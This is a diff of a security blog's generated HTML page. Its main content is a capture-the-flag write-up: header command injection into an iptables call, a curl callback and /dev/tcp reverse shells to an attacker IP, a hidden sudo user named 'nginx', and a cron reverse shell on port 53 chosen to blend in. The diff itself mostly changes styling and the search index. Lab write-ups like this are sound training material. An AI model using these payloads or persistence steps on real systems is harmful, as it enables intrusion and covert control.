-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;sudo /usr/sbin/iptables -A INPUT -s &#34;</span> . 10.10.14.22; bash -c <span style="color:#e6db74">&#34;curl http://10.10.14.22:9000/POC 0&lt;&amp;1&#34;</span>;  . <span style="color:#e6db74">&#34; -j ACCEPT&#34;</span><span style="color:#f92672">)</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;sudo /usr/sbin/iptables -A INPUT -s &#34;</span> . 10.10.14.22; bash -c <span style="color:#e6db74">&#34;curl http://10.10.14.22:9000/POC 0&lt;&amp;1&#34;</span>;  . <span style="color:#e6db74">&#34; -j ACCEPT&#34;</span><span style="color:#f92672">)</span>;
 </span></span></code></pre></div><h4 id="sending-our-payload">Sending Our Payload:</h4>
 <p>Now we need to intercept a <code>GET</code> request from the site to <code>firewall.php</code> so we can pass this. Let&rsquo;s go back to burp.</p>
 <p>We navigate to <code>http://10.129.96.75/challenge.php</code> and enter the flag <code>UHC{F1rst_5tep_2_Qualify}</code> we retrieved via SQLi Union Injection earlier to trigger the post request to add our IP to the host.</p>
@@ -707,7 +707,7 @@ This ensures the <code>iptables</code> command completes as intended:
 </p>
 </p>
 <p>We are going to insert out payload</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>x-forwarded-for: 10.10.14.22; bash -c <span style="color:#e6db74">&#34;curl http://10.10.14.22:9000/POC 0&lt;&amp;1&#34;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>x-forwarded-for: 10.10.14.22; bash -c <span style="color:#e6db74">&#34;curl http://10.10.14.22:9000/POC 0&lt;&amp;1&#34;</span>;
 </span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-08-11-184621_.png" alt=""  />
 </p>
@@ -721,16 +721,16 @@ If you want you can also see it rendered on the page too.
 <h3 id="getting-a-reverse-shell-via-header-command-injection">Getting A Reverse Shell Via Header Command Injection:</h3>
 <p>Using the same format as before we should be able to get a reverse shell.</p>
 <p>Let&rsquo;s start our listener.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">80</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">80</span>
 </span></span></code></pre></div><p>And send our payload.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>x-forwarded-for: 10.10.14.22; bash -c <span style="color:#e6db74">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.22/80 0&gt;&amp;1&#34;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>x-forwarded-for: 10.10.14.22; bash -c <span style="color:#e6db74">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.22/80 0&gt;&amp;1&#34;</span>;
 </span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-08-11-193344_.png" alt=""  />
 </p>
 
 We get our shell as the user <code>www-data</code>.</p>
 <p>The shell is pretty unstable so let&rsquo;s upgrade it using python.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-08-11-194420_.png">
 </figure>
 
@@ -741,7 +741,7 @@ We get our shell as the user <code>www-data</code>.</p>
 </p>
 
 This means we can easily switch to a root shell using</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo /bin/bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo /bin/bash
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-08-11-194509_.png">
 </figure>
 
@@ -757,27 +757,27 @@ This means we can easily switch to a root shell using</p>
 <figure><img src="/ox-hugo/2025-08-11-194814_.png">
 </figure>
 
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo useradd -m -s /bin/bash nginx
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo useradd -m -s /bin/bash nginx
 </span></span></code></pre></div><ul>
 <li>Creates a new user named <code>nginx</code>.</li>
 <li><code>-m</code>: Creates a home directory for the user.</li>
 <li><code>-s /bin/bash</code>: Sets the user&rsquo;s default shell to <code>/bin/bash</code>.</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo usermod -aG sudo nginx
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo usermod -aG sudo nginx
 </span></span></code></pre></div><ul>
 <li>Adds the <code>nginx</code> user to the <code>sudo</code> group.</li>
 <li><code>-a</code>: Appends the user to the group (avoids overwriting existing groups).</li>
 <li><code>-G sudo</code>: Specifies the <code>sudo</code> group.</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo passwd nginx
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo passwd nginx
 </span></span></code></pre></div><ul>
 <li>Sets or updates the password for the <code>nginx</code> user.</li>
 <li>Prompts us to add a new password and confirms it.</li>
 </ul>
 <p>Let&rsquo;s switch to the newly created user to ensure it works.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>su nginx
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>su nginx
 </span></span></code></pre></div><p>Let&rsquo;s check we have sudo privileges.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo -l
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo -l
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-08-11-195110_.png">
 </figure>
 
@@ -789,7 +789,7 @@ This means we can easily switch to a root shell using</p>
 As we can see we do.</p>
 <h3 id="creating-a-cron-job-reverse-shell">Creating a cron job reverse shell:</h3>
 <p>Having a high privilege user is good and all but not ideal if we can&rsquo;t access it due to ip whitelisting, so instead let&rsquo;s create a cronjob reverse shell….I know, I know we could update <code>iptables</code>, but where is the fun in that?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>crontab -l &gt; .tab ; echo <span style="color:#e6db74">&#34;* * * * * /bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.22/53 0&gt;&amp;1&#39;&#34;</span> &gt;&gt; .tab ; crontab .tab ; rm .tab<span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>crontab -l &gt; .tab ; echo <span style="color:#e6db74">&#34;* * * * * /bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.22/53 0&gt;&amp;1&#39;&#34;</span> &gt;&gt; .tab ; crontab .tab ; rm .tab<span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><p>We will set it to run every 1 minute and also use port 53 (DNS) so it blends in.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-08-11-195617_.png" alt=""  />
@@ -996,6 +996,13 @@ document.addEventListener("DOMContentLoaded", function() {
 <script>
 window.store = {
     
+    "\/\/uildDrafts:1313\/tags\/ansible\/": {
+        "title": "Ansible",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
+    },
+    
     "\/\/uildDrafts:1313\/author\/": {
         "title": "Author",
         "tags": [],
@@ -1003,11 +1010,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/author\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/blind\/": {
-        "title": "Blind",
+    "\/\/uildDrafts:1313\/tags\/automation\/": {
+        "title": "Automation",
         "tags": [],
         "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
+        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
     },
     
     "\/\/uildDrafts:1313\/author\/bloodstiller\/": {
@@ -1022,6 +1029,55 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
+        "title": "Dotfiles",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/kali\/": {
+        "title": "Kali",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/qemu\/": {
+        "title": "Qemu",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/": {
+        "title": "Security Newsroom Obsidian Plugin Release",
+        "tags": ["kali","automation","qemu","ansible","dotfiles",],
+        "content": "Security Newsroom Obsidian Plugin Release I\u0026rsquo;ve been quiet for a while. Work has been busy \u0026amp; I have been doing some other projects that I can\u0026rsquo;t get into\u0026hellip;\u0026hellip;\nI\u0026rsquo;ve made the switch from my beloved eMacs to obsidian over the last few months and apart from the first week it\u0026rsquo;s been relatively painless. I\u0026rsquo;ve managed to recreate 99% of all eMacs functionality in obsidian (that\u0026rsquo;s functionality I used, not all of eMacs functionality as that would not be possible.)\nOne thing that I have found myself needing is an easy way to keep up with security related news. As the landscape is constantly evolving and growing and there a million different sources to get information from I got bored of jumping around so I thought \u0026ldquo;what if it was just in obsidian\u0026rdquo;. I use obsidian as my web-clipper anyone so let\u0026rsquo;s just put the functionality in here (I say here as I am writing the post in Obsidian)\nSo I decided to create the security newsroom plugin. https://github.com/bloodstiller/obsidian-security-newsroom I\u0026rsquo;ve created a pull request for it to be placed into the official community plugins but so far it has not.\nIt essentially pulls from lots of security resources and allows you to filter, save \u0026amp; clip the whole articles directly within obsidian.\nFull video showing how it works. At the moment as it\u0026rsquo;s not currently approved in the obsidian store if you want to use it you will have to manually add a folder called in your .obsidian/plugins folder called security-newsroom and place the main.js, manifest.json \u0026amp; styles.css from the repo and then load the plugin.\n", 
+        "url": "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/": {
+        "title": "Tags",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/": {
+        "title": "Tools",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tools\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/blind\/": {
+        "title": "Blind",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/ctf-writeup\/": {
@@ -1101,13 +1157,6 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/portswigger\/sqli_lab_15\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/": {
-        "title": "Tags",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/"
-    },
-    
     "\/\/uildDrafts:1313\/tags\/waf\/": {
         "title": "Waf",
         "tags": [],
@@ -1116,7 +1165,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/web-exploitation\/": {
-        "title": "Web-Exploitation",
+        "title": "Web Exploitation",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/web-exploitation\/"
@@ -1529,7 +1578,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/llm\/": {
-        "title": "Llm",
+        "title": "LLM",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/llm\/"
@@ -1984,7 +2033,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/msi\/": {
-        "title": "MSI",
+        "title": "Msi",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/msi\/"
@@ -2380,13 +2429,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/tools\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tools\/": {
-        "title": "Tools",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tools\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/vulnerability-assessment\/": {
@@ -2838,7 +2880,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/ssrf\/": {
-        "title": "Ssrf",
+        "title": "SSRF",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/ssrf\/"
@@ -3348,46 +3390,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/homelab\/20250220118-nixos-homelab\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/ansible\/": {
-        "title": "Ansible",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
-    },
-    
     "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/": {
         "title": "Automating Kali Linux VM Setup: A Comprehensive Guide to QEMU and Ansible Integration",
         "tags": ["kali","automation","qemu","ansible","dotfiles",],
         "content": "As a cybersecurity enthusiast and productivity junkie, I\u0026rsquo;ve always been fascinated by the power of automation. Recently, I decided to streamline my process of setting up Kali Linux virtual machines using QEMU and Ansible. In this article, I\u0026rsquo;ll walk you through how I\u0026rsquo;ve automated the creation and configuration of Kali VMs, complete with my preferred dotfiles and tools.\nThe Need for Automation If you\u0026rsquo;re like me, you probably find yourself creating new Kali VMs frequently for various projects or testing environments. The process of setting up a new VM, updating the system, installing your favorite tools, and configuring your environment can be time-consuming and repetitive. That\u0026rsquo;s where automation comes in handy. You can repurpose this setup for other projects, just change the Ansible playbook and dotfiles.\nBenefits and Challenges This automation setup offers several advantages:\nConsistent environment across all VMs Rapid deployment of new instances Version-controlled configuration (infrastructure as code) Easy sharing and collaboration Some challenges I encountered:\nVirtioFS setup complexity Ansible role organization Package version management Dotfiles synchronization But the benefits far outweigh the initial setup effort.\nPrerequisites Choose your preferred virtualization provider:\nVirtualBox Setup VirtualBox Vagrant Ansible QEMU/KVM Setup (Linux only) (My preferred setup) QEMU/KVM (≥ 4.2) Libvirt (≥ 6.2.0) Vagrant Ansible For QEMU/KVM shared folder support:\nHost: Linux kernel ≥ 5.4\nGuest: Linux kernel ≥ 5.4\nThere is some additional setup required for the vagrant-libvirt plugin so would advise you checkout QEMU/KVM Setup Guide Unable to resolve dependency vagrant-libvirterror: +Update+ 21/02/2025 I recently ran an update and encountered an issue where it refused to launch new VM\u0026rsquo;s. I received an error similar to the below (it was not exactly the same as I had a crash shortly after). Error message given during initialization: Unable to resolve dependency: user requested 'vagrant-libvirt (= 0.12.2)' after alot of searching I found this post I found following the steps resolved the issue. vagrant plugin repair vagrant plugin expunge --reinstall vagrant plugin update VAGRANT_DISABLE_STRICT_DEPENDENCY_ENFORCEMENT=1 vagrant plugin install vagrant-libvirt The Automation Stack My automation setup consists of three main components:\nVagrant for VM provisioning QEMU/KVM for virtualization Ansible for configuration management Let\u0026rsquo;s dive into each component.\n1. Vagrant with QEMU/KVM I chose QEMU/KVM over VirtualBox for several reasons:\nBetter performance on Linux hosts Once you have used KVM/QEMU you will never go back to VirtualBox etc. Native virtualization support VirtioFS for efficient file sharing The Vagrantfile handles:\nVM resource allocation (RAM, CPU) Network configuration Shared folder setup with VirtioFS Ansible provisioner integration Here\u0026rsquo;s the the Vagrantfile:\n# -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;kalilinux/rolling\u0026#34; config.vm.hostname = \u0026#34;kali-vm\u0026#34; # Set hostname inside VM # Disable the default share config.vm.synced_folder \u0026#34;.\u0026#34;, \u0026#34;/vagrant\u0026#34;, disabled: true # Force libvirt provider ENV[\u0026#39;VAGRANT_DEFAULT_PROVIDER\u0026#39;] = \u0026#39;libvirt\u0026#39; # QEMU/libvirt specific settings config.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 libvirt.graphics_type = \u0026#34;spice\u0026#34; libvirt.video_type = \u0026#34;qxl\u0026#34; libvirt.title = \u0026#34;Kali Linux VM\u0026#34; # Set VM title in libvirt libvirt.description = \u0026#34;Kali Linux VM for Security Testing\u0026#34; # Optional description # Enable shared memory for VirtioFS libvirt.memorybacking :access, :mode =\u0026gt; \u0026#34;shared\u0026#34; end # Configure shared folders using VirtioFS config.vm.synced_folder \u0026#34;/home/martin/.config/tmuxinator\u0026#34;, \u0026#34;/home/vagrant/.config/tmuxinator\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.02-LinuxTools\u0026#34;, \u0026#34;/home/vagrant/linuxTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.01-WindowsTools\u0026#34;, \u0026#34;/home/vagrant/windowsTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career\u0026#34;, \u0026#34;/home/vagrant/Dropbox/40-49_Career\u0026#34;, type: \u0026#34;virtiofs\u0026#34; # Network settings config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.57.11\u0026#34; config.ssh.forward_x11 = true # Provisioning configuration for Ansible config.vm.provision \u0026#34;ansible\u0026#34; do |ansible| ansible.playbook = \u0026#34;../../Ansible/configure-kali.yml\u0026#34; end end 2. Ansible Configuration Ansible automates the entire VM setup process. The main playbook handles:\nSystem updates and package installation Development tools setup Security tools installation Terminal environment configuration (Alacritty, Tmux) Editor setup (Doom Emacs) Dotfiles deployment Here\u0026rsquo;s the main Ansible playbook:\n--- - name: Configure Kali Linux hosts: all become: yes # This is equivalent to using sudo vars: user_home: \u0026#34;/home/vagrant\u0026#34; docker_gpg_key_url: \u0026#34;https://download.docker.com/linux/debian/gpg\u0026#34; docker_repo: \u0026#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable\u0026#34; tasks: - name: Update apt cache apt: update_cache: yes cache_valid_time: 3600 - name: Download Iosevka Nerd Font (be patient big file!) get_url: url: https://github.com/ryanoasis/nerd-fonts/releases/download/v3.3.0/Iosevka.zip dest: /tmp/Iosevka.zip mode: \u0026#39;0644\u0026#39; - name: Install unzip if not present apt: name: unzip state: present - name: Extract Iosevka font unarchive: src: /tmp/Iosevka.zip dest: \u0026#34;/usr/local/share/fonts/\u0026#34; remote_src: yes owner: vagrant group: vagrant - name: Update font cache command: fc-cache -fv become_user: vagrant - name: Install base packages apt: name: - eza - alacritty - git - bat - seclists - git - emacs - ripgrep - fd-find state: present - name: Create docker GPG directory file: path: /etc/apt/keyrings state: directory mode: \u0026#39;0755\u0026#39; - name: Check if Docker GPG key exists stat: path: /etc/apt/keyrings/docker.gpg register: docker_gpg - name: Add Docker GPG key shell: | curl -fsSL {{ docker_gpg_key_url }} | gpg --dearmor -o /etc/apt/keyrings/docker.gpg when: not docker_gpg.stat.exists - name: Check if Docker repository exists stat: path: /etc/apt/sources.list.d/docker.list register: docker_repo_file - name: Add Docker repository copy: content: \u0026#34;{{ docker_repo }}\u0026#34; dest: /etc/apt/sources.list.d/docker.list when: not docker_repo_file.stat.exists - name: Install Docker packages apt: name: - docker-ce - docker-ce-cli - containerd.io update_cache: yes state: present - name: Download Starship install script get_url: url: https://starship.rs/install.sh dest: /tmp/starship-install.sh mode: \u0026#39;0755\u0026#39; register: download_script - name: Install Starship shell: /tmp/starship-install.sh --yes args: creates: /usr/local/bin/starship when: download_script is success async: 180 # 5 minute timeout poll: 5 # Check every 5 seconds - name: Install oh-my-zsh become_user: vagrant shell: sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; \u0026#34;\u0026#34; --unattended args: creates: \u0026#34;{{ user_home }}/.oh-my-zsh\u0026#34; - name: Install zsh plugins become_user: vagrant git: repo: \u0026#34;{{ item.repo }}\u0026#34; dest: \u0026#34;{{ user_home }}/.oh-my-zsh/custom/plugins/{{ item.name }}\u0026#34; loop: - { repo: \u0026#39;https://github.com/zsh-users/zsh-autosuggestions\u0026#39;, name: \u0026#39;zsh-autosuggestions\u0026#39; } - { repo: \u0026#39;https://github.com/zsh-users/zsh-syntax-highlighting.git\u0026#39;, name: \u0026#39;zsh-syntax-highlighting\u0026#39; } - { repo: \u0026#39;https://github.com/marlonrichert/zsh-autocomplete.git\u0026#39;, name: \u0026#39;zsh-autocomplete\u0026#39; } - { repo: \u0026#39;https://github.com/zdharma-continuum/fast-syntax-highlighting.git\u0026#39;, name: \u0026#39;fast-syntax-highlighting\u0026#39; } - name: Install tmuxinator gem: name: tmuxinator state: present - name: Clone Statistically Likely Usernames git: repo: https://github.com/insidetrust/statistically-likely-usernames.git dest: /usr/share/wordlists/statistically-likely-usernames - name: Download and install Kerbrute get_url: url: https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 dest: /usr/local/bin/kerbrute mode: \u0026#39;0755\u0026#39; - name: Install build dependencies for Emacs apt: name: - build-essential - libgccjit-12-dev - libgnutls28-dev - libjansson4 - libjansson-dev - libncurses-dev - libsqlite3-dev - libgif-dev - libjpeg-dev - libpng-dev - libtiff5-dev - libxpm-dev - libwebp-dev - libgtk-3-dev - texinfo - autoconf - automake - pkg-config state: present install_recommends: no register: pkg_result retries: 3 delay: 5 until: pkg_result is success - name: Install tree-sitter separately apt: name: libtree-sitter-dev state: present register: tree_sitter_result retries: 3 delay: 5 until: tree_sitter_result is success - name: Check if Emacs 29.4 is installed command: emacs --version register: emacs_version ignore_errors: true changed_when: false - name: Clone Emacs repository git: repo: git://git.savannah.gnu.org/emacs.git dest: /tmp/emacs version: emacs-29.4 when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Run autogen shell: | cd /tmp/emacs ./autogen.sh when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Configure Emacs shell: | cd /tmp/emacs ./configure --with-native-compilation --with-json --with-tree-sitter --with-sqlite3 args: creates: /tmp/emacs/Makefile when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Build Emacs shell: | cd /tmp/emacs make -j$(nproc) args: creates: /tmp/emacs/src/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 1800 poll: 15 - name: Install Emacs become: yes shell: | cd /tmp/emacs make install args: creates: /usr/local/bin/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 900 poll: 15 - name: Install other base packages apt: name: - eza - alacritty - git - bat - seclists - ripgrep - fd-find state: present install_recommends: no - name: Setup dotfiles become_user: vagrant block: - name: Clone dotfiles git: repo: https://github.com/bloodstiller/kaliconfigs.git dest: \u0026#34;{{ user_home }}/.dotfiles\u0026#34; version: main # Or whatever branch you\u0026#39;re using update: yes # Ensures latest version is cloned clone: yes force: yes # This will overwrite local changes - name: Create required directories file: path: \u0026#34;{{ item }}\u0026#34; state: directory loop: - \u0026#34;{{ user_home }}/.doom.d\u0026#34; - \u0026#34;{{ user_home }}/.config\u0026#34; - name: Create symlinks file: src: \u0026#34;{{ item.src }}\u0026#34; dest: \u0026#34;{{ item.dest }}\u0026#34; state: link force: yes loop: - { src: \u0026#34;{{ user_home }}/.dotfiles/Zsh/.zshrc\u0026#34;, dest: \u0026#34;{{ user_home }}/.zshrc\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/config.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/config.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/init.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/init.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/packages.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/packages.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/README.org\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/README.org\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Starship/starship.toml\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/starship.toml\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Alacritty\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/Alacritty\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Tmux/.tmux.conf\u0026#34;, dest: \u0026#34;{{ user_home }}/.tmux.conf\u0026#34; } - name: Install Doom Emacs become_user: vagrant block: - name: Clone Doom Emacs git: repo: https://github.com/doomemacs/doomemacs dest: \u0026#34;{{ user_home }}/.config/emacs\u0026#34; depth: 1 - name: Install Doom Emacs # This is correct and the path is correct! shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom install --force\u0026#34; args: creates: \u0026#34;{{ user_home }}/.emacs.d/bin/doom\u0026#34; async: 900 poll: 15 - name: Update Doom recipe repositories shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom sync -u\u0026#34; async: 900 poll: 15 - name: Enable Docker service systemd: name: docker enabled: yes state: started - name: Add user to docker group user: name: vagrant groups: docker append: yes - name: Clean up apt: autoremove: yes clean: 